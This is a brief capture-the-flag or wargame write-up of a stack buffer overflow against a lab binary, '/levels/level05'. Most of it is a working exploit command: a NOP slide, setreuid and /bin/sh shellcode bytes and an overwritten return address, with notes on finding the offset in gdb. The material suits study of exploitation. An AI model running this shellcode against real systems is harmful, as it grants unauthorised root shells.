
Standard nop slide into setreuid shellcode after discovering overwrite of return address in the stack frame.

Used a couple of cool techniques here:
1. in python ''.join(['x%03d'%x for x in range(1,250)]) to generate 4byte aligned memory pad, so when we overwrote memory we could easily see this in gdb (x/64x $esp & i r show interesting stuff)
2. once length of return address overwrite discovered, inject a nice long nop slide with shellcode towards the end

/levels/level05 `echo -e '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'``echo -e '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90'``echo -e '\xd9\xdb\xff\xbf'`

Makes me feel like writing some good tools to generate the memory pad, plus workout alignment of nop sled, etc (another dayâ€¦)




